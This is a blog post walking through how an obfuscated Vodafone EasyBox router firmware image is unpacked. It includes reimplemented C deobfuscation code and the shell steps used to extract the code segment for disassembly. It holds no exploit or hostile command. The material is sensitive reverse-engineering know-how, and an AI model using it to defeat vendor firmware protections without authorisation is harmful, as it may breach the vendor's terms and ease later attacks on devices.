<p>After I miserably failed at recognizing the obfuscation method just by looking at the hexdump I had to move on. I suspected that the deobfuscation is handled by the bootloader itself, so that was the next thing I wanted to look at. Luckily Vodafone had to update the bootloader for Easybox 802 (predecessor to EasyBox 803) to enable some random functionality and kindly provided a <a href="http://www.arcor.de/hilfe/files/pdf/InfBoot_danube_1.00.02.bin" target="_blank">copy</a>, otherwise dumping the flash would have been necessary.</p>
<p><img data-attachment-id="35" data-permalink="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/call_to_unzipfw/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181" data-orig-size="782,181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="call_to_unzipfw" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181?w=782" class="alignnone size-full wp-image-35" title="call_to_unzipfw" src="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181" alt="" width="782" height="181" srcset="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png 782w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=150&amp;h=35 150w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=300&amp;h=69 300w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=768&amp;h=178 768w" sizes="(max-width: 782px) 100vw, 782px" /></p>
<p><strong>unzip_fw</strong> looks like this:</p>
<p><img data-attachment-id="55" data-permalink="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/fw_unzip2-3/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=815&#038;h=862" data-orig-size="815,862" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="fw_unzip2" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=815&#038;h=862?w=284" data-large-file="https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=815&#038;h=862?w=815" class="alignnone size-full wp-image-55" title="fw_unzip2" src="https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=815&#038;h=862" alt="" width="815" height="862" srcset="https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png 815w, https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=142&amp;h=150 142w, https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=284&amp;h=300 284w, https://sviehb.files.wordpress.com/2011/09/fw_unzip22.png?w=768&amp;h=812 768w" sizes="(max-width: 815px) 100vw, 815px" /></p>
<p>As the deobfuscation and LZMA unpacking is indeed handled by the bootloader, I reversed and reimplemented their fancy deobfuscation routine (<strong>deobfuscate_ZIP3</strong>):</p>
<pre class="brush: cpp; title: ; notranslate" title="">
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;

//xor chars in str with xorchar
void xor(unsigned char* bytes, int len, char xorchar) {
	int i;

	for (i = 0; i &lt; len; i++) {
		bytes[i] = bytes[i] ^ xorchar;
	}
}

//swap high and low bits in bytes in str
//0x12345678 -&gt; 0x21436578
void hilobswap(unsigned char* bytes, int len) {
	int i;

	for (i = 0; i &lt; len; i++) {
		bytes[i] = (bytes[i] &lt;&lt; 4) + (bytes[i] &gt;&gt; 4);
	}
}

//swap byte[i] with byte[i+1]
//0x12345678 -&gt; 0x34127856
void wswap(unsigned char* bytes, int len) {
	int i;
	unsigned char tmp;

	for (i = 0; i &lt; len; i += 2) {
		tmp = bytes[i];
		bytes[i] = bytes[i + 1];
		bytes[i + 1] = tmp;
	}
}

int main(int argc, char *argv[]) {
	unsigned char* buffer;
	unsigned char* tmpbuffer[0x400];
	size_t insize;
	FILE *infile, *outfile;

	if (argc != 3) {
		printf(&quot;usage: easybox_deobfuscate infile outfile.bin.lzma\n&quot;);
		return -1;
	}

	//read obfuscated file
	infile = fopen(argv[1], &quot;rb&quot;);

	if (infile == NULL) {
		fputs(&quot;cant open infile&quot;, stderr);
		return -1;
	}

	fseek(infile, 0, SEEK_END);
	insize = ftell(infile);
	rewind(infile);

	buffer = (unsigned char*) malloc(insize);
	if (buffer == NULL) {
		fputs(&quot;memory error&quot;, stderr);
		exit(2);
	}

	printf(&quot;read \t%i bytes\n&quot;, fread(buffer, 1, insize, infile));
	fclose(infile);

	printf(&quot;descrambling file ...\n&quot;);
	//xor HITECH
	xor(buffer + 0x404, 0x400, 0x48);
	xor(buffer + 0x804, 0x400, 0x49);
	xor(buffer + 0x4, 0x400, 0x54);
	xor(buffer + 0x404, 0x400, 0x45);
	xor(buffer + 0x804, 0x400, 0x43);
	xor(buffer + 0xC04, 0x400, 0x48);

	//swap 0x4 0x404
	memcpy(tmpbuffer, buffer + 0x4, 0x400);
	memcpy(buffer + 0x4, buffer + 0x404, 0x400);
	memcpy(buffer + 0x404, tmpbuffer, 0x400);

	//xor NET
	xor(buffer + 0x4, 0x400, 0x4E);
	xor(buffer + 0x404, 0x400, 0x45);
	xor(buffer + 0x804, 0x400, 0x54);

	//swap 0x4 0x804
	memcpy(tmpbuffer, buffer + 0x4, 0x400);
	memcpy(buffer + 0x4, buffer + 0x804, 0x400);
	memcpy(buffer + 0x804, tmpbuffer, 0x400);

	//xor BRN
	xor(buffer + 0x4, 0x400, 0x42);
	xor(buffer + 0x404, 0x400, 0x52);
	xor(buffer + 0x804, 0x400, 0x4E);

	//fix header #1
	memcpy(tmpbuffer, buffer + 0x4, 0x20);
	memcpy(buffer + 0x4, buffer + 0x68, 0x20);
	memcpy(buffer + 0x68, tmpbuffer, 0x20);

	//fix header #2
	hilobswap(buffer + 0x4, 0x20);
	wswap(buffer + 0x4, 0x20);

	//write deobfuscated file
	outfile = fopen(argv[2], &quot;wb&quot;);

	if (outfile == NULL) {
		fputs(&quot;cant open outfile&quot;, stderr);
		return -1;
	}

	printf(&quot;wrote \t%i bytes\n&quot;, fwrite(buffer + 4, 1, insize - 4, outfile));
	fclose(outfile);

	printf(&quot;all done! - use lzma to unpack&quot;);

	return 0;
}
</pre>
<p>You can see that it would have been impossible to understand how the obfuscation works without looking at the actual assembly. Luckily this routine also works for EasyBox 803.</p>
<p>Let&#8217;s unpack first segment, which is the biggest one and therefore most likely to contain code.</p>
<pre>&gt;fdd if=dsl_803_752DPW_FW_30.05.211.bin of=dsl_803_s1_obfuscated count=0x1e83a4
count   : 0x1e83a4      1999780
skip    : 0x0   0
seek    : 0x0   0
1999780+0 records in
1999780+0 records out
1999780 bytes (2.00 MB) copied, 0.009540 s, 199.90 MB/s

&gt;easybox_deobfuscate dsl_803_s1_obfuscated dsl_803_s1.bin.lzma
read    1999780 bytes
descrambling file ...
wrote   1999776 bytes
all done! - use lzma to unpack

&gt;xz -d dsl_803_s1.bin.lzma

&gt;l dsl_803_s1*
-rw-r--r--+ 1 stefan None 8.3M  6. Sep 11:27 dsl_803_s1.bin
-rw-r--r--+ 1 stefan None 2.0M  6. Sep 11:25 dsl_803_s1_obfuscated

dsl_803_s1.bin:
00000000h: 40 02 60 00 3C 01 00 40 00 41 10 24 40 82 60 00 ; @.`.&lt;..@.A.$@‚`.
00000010h: 40 80 90 00 40 80 98 00 40 1A 60 00 24 1B FF FE ; @€.@€˜.@.`.$.ÿþ
00000020h: 03 5B D0 24 40 9A 60 00 40 80 68 00 40 80 48 00 ; .[Ð$@š`.@€h.@€H.
00000030h: 40 80 58 00 00 00 00 00 04 11 00 01 00 00 00 00 ; @€X.............
00000040h: 03 E0 E0 25 8F E9 00 00 03 89 E0 20 00 00 00 00 ; .àà%é...‰à ....
00000050h: 00 00 00 00 00 00 00 00 24 04 40 00 24 05 00 10 ; ........$.@.$...
00000060h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ; ................
00000070h: 3C 06 80 00 00 C4 38 21 00 E5 38 23 BC C1 00 00 ; &lt;.€..Ä8!.å8#¼Á..
00000080h: 14 C7 FF FE 00 C5 30 21 00 00 00 00 00 00 00 00 ; .Çÿþ.Å0!........
00000090h: 00 00 00 00 00 00 00 00 24 04 40 00 24 05 00 10 ; ........$.@.$...
...</pre>
<p>Now we can load the file into IDA. This sounds easier than it is, because the unpacked firmware segment is raw code (mipsb) and data without information about segmentation, like you would have when dealing with a PE or ELF binary.</p>
<p><a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/">Continued in E02: Reverse engineering an obfuscated firmware image &#8211; analysis</a></p>
<p>Note: Most of this research was conducted several months ago and my findings were probably not in this particular order. &#8211; I think it just makes more sense presenting it this way.<br />
Note²: fdd is my silly Python implementation of dd. It takes HEX-offsets and has bs=1 by default.<br />
Note³: Make sure to comply with <a href="http://dsl.vodafone.de/hilfe/download.php?id=9999&amp;hoehe_box=1000" target="_blank">Vodafone&#8217;s terms of use</a>.</p>
	</div>

	<div class="feedback">
                        <a href="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/#comments">Comments (28)</a>	</div>

</div>




<!-- begin footer -->
</div>


<!-- begin sidebar -->
<div id="menu">

<ul>
		<li id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
					<li>
				<a href="https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/">Wi-Fi Protected Setup PIN brute force&nbsp;vulnerability</a>
						</li>
					<li>
				<a href="https://sviehb.wordpress.com/2011/12/08/ucsb-ictf-smsgw-memory-corruption-exploit/">UCSB iCTF smsgw Memory Corruption&nbsp;Exploit</a>
						</li>
					<li>
				<a href="https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/">A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm&nbsp;Weakness</a>
						</li>
					<li>
				<a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/">Reverse engineering an obfuscated firmware image E02 &#8211;&nbsp;analysis</a>
						</li>
					<li>
				<a href="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/">Reverse engineering an obfuscated firmware image E01 &#8211;&nbsp;unpacking</a>
						</li>
				</ul>
		</li>
		<li id="archives-3" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
			<li><a href='https://sviehb.wordpress.com/2011/12/'>December 2011</a></li>
	<li><a href='https://sviehb.wordpress.com/2011/09/'>September 2011</a></li>
		</ul>
		</li>
<li id="search-3" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://sviehb.wordpress.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form></li>
<li id="rss_links-3" class="widget widget_rss_links"><ul><li><a href="https://sviehb.wordpress.com/feed/" title="Subscribe to Posts">RSS - Posts</a></li><li><a href="https://sviehb.wordpress.com/comments/feed/" title="Subscribe to Comments">RSS - Comments</a></li></ul>
</li>
<li id="text-4" class="widget widget_text">			<div class="textwidget">Twitter: <a href="https://twitter.com/#!/sviehb" target="_blank">(@sviehb)</a></div>
		</li>

</ul>

</div>


<p class="credit"><cite> <a href="https://wordpress.com/?ref=footer_blog">Blog at WordPress.com.</a></cite></p>

</div>

<!--  -->
	<div style="display:none">
	</div>
<script type='text/javascript'>
/* <![CDATA[ */
var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Posting Comment\u2026","postCommentText":"Post Comment","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Out","loginText":"Log In","connectURL":"https:\/\/sviehb.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/sviehb.wordpress.com\/wp-login.php?action=logout&_wpnonce=52ebc371bb","homeURL":"https:\/\/sviehb.wordpress.com\/","postID":"225","gravDefault":"identicon","enterACommentError":"Please enter a comment","enterEmailError":"Please enter your email address here","invalidEmailError":"Invalid email address","enterAuthorError":"Please enter your name here","gravatarFromEmail":"This picture will show whenever you leave a comment. Click to customize it.","logInToExternalAccount":"Log in to use details from one of these accounts.","change":"Change","changeAccount":"Change Account","comment_registration":"","userIsLoggedIn":"","isJetpack":"0","text_direction":"ltr"};
/* ]]> */
</script>
<script type='text/javascript' src='https://s2.wp.com/_static/??/wp-content/js/jquery/jquery.autoresize.js,/wp-content/mu-plugins/highlander-comments/script.js?m=1479964158j'></script>

	<div id="carousel-reblog-box">
		<form action="#" name="carousel-reblog">
			<textarea id="carousel-reblog-content" name="carousel-reblog-content" placeholder="Add your thoughts here... (optional)"></textarea>
			<label for="carousel-reblog-to-blog-id" id="carousel-reblog-lblogid">Post to</label>
			<select name="carousel-reblog-to-blog-id" id="carousel-reblog-to-blog-id">
						</select>

			<div class="submit">
				<span class="canceltext"><a href="#" class="cancel">Cancel</a></span>
				<input type="submit" name="carousel-reblog-submit" class="button" id="carousel-reblog-submit" value="Reblog Post" />
				<input type="hidden" id="carousel-reblog-blog-id" value="26874569" />
				<input type="hidden" id="carousel-reblog-blog-url" value="https://sviehb.wordpress.com" />
				<input type="hidden" id="carousel-reblog-blog-title" value=".braindump - RE and stuff" />
				<input type="hidden" id="carousel-reblog-post-url" value="" />
				<input type="hidden" id="carousel-reblog-post-title" value="" />
			</div>

			<input type="hidden" id="_wpnonce" name="_wpnonce" value="52461c376d" /><input type="hidden" name="_wp_http_referer" value="/" />		</form>

		<div class="arrow"></div>
	</div>
<script type='text/javascript' src='https://s0.wp.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKioFmldQQE3jAnISM/OoamBlSUY+yET7XFtDEyMjYxMjQ2OTLAD4k3/g'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414h&amp;ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

// Infinite scroll support
jQuery( function( $ ) {
	$( document.body ).on( 'post-load', function() {
		SyntaxHighlighter.highlight();
	} );
} );
</script>
<link rel='stylesheet' id='all-css-0-3' href='https://s1.wp.com/wp-content/mu-plugins/carousel/jetpack-carousel.css?m=1481571546h' type='text/css' media='all' />
<!--[if lte IE 8]>
<link rel='stylesheet' id='jetpack-carousel-ie8fix-css'  href='https://s1.wp.com/wp-content/mu-plugins/carousel/jetpack-carousel-ie8fix.css?m=1412618825h&#038;ver=20121024' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {"siteID":"26874569","siteName":".braindump - RE and stuff","siteURL":"http:\/\/sviehb.wordpress.com","icon":"<img alt='' src='https:\/\/s1.wp.com\/i\/logo\/wpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/rubric","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/sviehb.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fsviehb.wordpress.com%2F2011%2F12%2F27%2Fwi-fi-protected-setup-pin-brute-force-vulnerability%2F","themeURL":"","xhrURL":"https:\/\/sviehb.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"dff72e24ea","isSingular":"","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"1a8722be98\" \/>","referer":"https:\/\/sviehb.wordpress.com\/","canFollow":"1","feedID":"10170709","statusMessage":"","customizeLink":"https:\/\/sviehb.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Fsviehb.wordpress.com%2F","i18n":{"view":"View site","follow":"Follow","following":"Following","edit":"Edit","login":"Log in","signup":"Sign up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Rubric","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editSubs":"Manage subscriptions","viewReader":"View site in Reader","viewReadPost":"View post in Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"Join 61 other followers","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/sviehb.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fsviehb.wordpress.com%2F2011%2F12%2F27%2Fwi-fi-protected-setup-pin-brute-force-vulnerability%2F\">Log in now.<\/a>","stats":"Stats"}};
/* ]]> */
</script>
<script type='text/javascript'>
/* <![CDATA[ */
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/sviehb.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"76d94c907c","display_exif":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/sviehb.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fsviehb.wordpress.com%2F2011%2F09%2F09%2Freverse-engineering-an-obfuscated-firmware-image-e02-analysis%2F","blog_id":"26874569","local_comments_commenting_as":"<fieldset><label for=\"email\">Email (Required)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Name (Required)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Website<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>","reblog":"Reblog","reblogged":"Reblogged","reblog_add_thoughts":"Add your thoughts here... (optional)","reblogging":"Reblogging...","post_reblog":"Post Reblog","stats_query_args":"blog=26874569&v=wpcom&tz=0&user_id=0&subd=sviehb","is_public":"1","reblog_enabled":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://s2.wp.com/_static/??-eJx9jksOwjAMRC9E6rYSnw3iLCGxwGnihHwK3J5UolUXVVcejcfPA+8glOeMnMEk0DiSwvBpTDrAauWKCLY8iBNYGjDBq2DBp2RtMe6EpXbE4i4jOJkyxqqEHzFG0hWyeHsElcnzRFjUnCZWtkycWjwF4i3f1KLx+x/NOrXxS8noS0ILBnOQahCzUW9u7tod2/506c59a3658HQN'></script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script><script src="//stats.wp.com/w.js?56" type="text/javascript" async defer></script>
<script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'26874569','blog_tz':'0','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'26874569','v':'wpcom','tz':'0','user_id':'0','subd':'sviehb'}]);
_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdTdvUG14Q2VDQTR4LlUsLi82dU1mai9BMlY0cFZwVGpsL1FOY2hkSUFfMV8tTk5dbmpbYkgsdEJxVkk5a3FxclpiMEFORVNiUkQ5bC9aUkd2bTdxdjMufitraG1TJjA2dy92OGNSY1FWPVYxTX5yVy5JcnJsRlRPPURnJm8wbz1zRHVrenwsRVBINGxfeW1FS0otY05BLTJKQmhHfEs2fCUvb112ZTZGcHw2S0FYLWljXURFcXxobzFDVVhZXzVDZU9odStxc0xwJj1Cbl9pVS1LNGp6K3F1cWZ3ZW5mNmE1LUprSXdY'}]);
_stq.push([ 'clickTrackerInit', '26874569', '0' ]);
	</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
<script>
if ( 'object' === typeof wpcom_mobile_user_agent_info ) {

	wpcom_mobile_user_agent_info.init();
	var mobileStatsQueryString = "";
	
	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
	
	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
	
	if( wpcom_mobile_user_agent_info.isIPad() )
		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';

	if( "" != mobileStatsQueryString ) {
		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
	}
	
}
</script></body>
</html>
<!--
	generated 3 seconds ago
	generated in 0.141 seconds
	served from batcache in 0.002 seconds
	expires in 297 seconds
-->
